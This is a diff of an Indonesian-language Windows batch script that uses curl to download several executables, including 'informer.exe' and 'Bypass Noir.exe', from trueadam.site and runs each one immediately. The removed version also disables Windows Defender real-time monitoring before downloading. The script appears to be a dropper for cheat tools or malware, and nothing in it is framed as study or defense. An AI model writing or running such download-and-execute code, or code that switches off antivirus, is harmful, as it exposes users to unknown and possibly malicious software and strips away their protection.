@@ -1,72 +1,32 @@
 @echo off
-title Sumpruy Downloader - Fixed
-set "DL_DIR=C:\Sumpruy_Downloads"
-mkdir "%DL_DIR%" 2>nul
-cd /d "%DL_DIR%"
+setlocal
+title MODE PC - TrueAdam
 
-:: Matiin antivirus sementara (kalau Windows Defender)
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+set DIR=C:\Sumpruy_Downloads
+mkdir "%DIR%" 2>nul
+cd /d "%DIR%"
 
-echo.
-echo ========================================
-echo MULAI DOWNLOAD DENGAN RETRY
-echo ========================================
-echo.
-
-:: DAFTAR FILE
-set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"
-
-:: LOOP DOWNLOAD + RETRY 3 KALI
-for %%F in (%FILES%) do (
-    setlocal enabledelayedexpansion
-    set "FILE=%%F"
-    set "URL=https://trueadam.site/%%F"
-    
-    echo Downloading !FILE!...
-    set "TRY=1"
-    :retry
-    if !TRY! GTR 3 (
-        echo ❌ Gagal download !FILE! setelah 3 kali percobaan.
-        goto next
-    )
-    
-    :: HAPUS FILE LAMA
-    if exist "!FILE!" del "!FILE!"
-    
-    :: DOWNLOAD PAKAI CURL
-    curl -L -o "!FILE!" "!URL!" --silent --show-error
-    
-    :: CEK UKURAN
-    if exist "!FILE!" (
-        for %%Z in ("!FILE!") do (
-            if %%~zZ LSS 10240 (
-                echo ⚠️ File !FILE! terlalu kecil (%%~zZ bytes), mencoba ulang...
-                del "!FILE!"
-                set /a TRY=!TRY!+1
-                timeout /t 2 /nobreak >nul
-                goto retry
-            ) else (
-                echo ✅ !FILE! berhasil didownload (%%~zZ bytes)
-                timeout /t 1 /nobreak >nul
-                echo 🚀 Menjalankan !FILE! ...
-                start "" "!FILE!"
-            )
-        )
+for %%A in (
+  "StarDesk.exe|https://trueadam.site/StarDesk.exe"
+  "informer.exe|https://trueadam.site/informer.exe"
+  "seeu.exe|https://trueadam.site/seeu.exe"
+  "Bypass Noir.exe|https://trueadam.site/Bypass%20Noir.exe"
+) do (
+  for /f "tokens=1,2 delims=|" %%B in (%%A) do (
+    echo Downloading %%B...
+    curl -L -o "%%B" "%%C"
+    if exist "%%B" (
+      echo ✅ %%B berhasil
+      start "" "%%B"
     ) else (
-        echo ⚠️ !FILE! gagal download, mencoba ulang...
-        set /a TRY=!TRY!+1
-        timeout /t 2 /nobreak >nul
-        goto retry
+      echo ❌ %%B gagal
     )
-    :next
-    endlocal
+    timeout /t 1 /nobreak >nul
+  )
 )
 
-:: Nyalakan lagi antivirus (opsional)
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
-
 echo.
 echo ========================================
-echo SELESAI. CEK FOLDER C:\Sumpruy_Downloads
+echo SELESAI. CEK C:\Sumpruy_Downloads
 echo ========================================
 pause
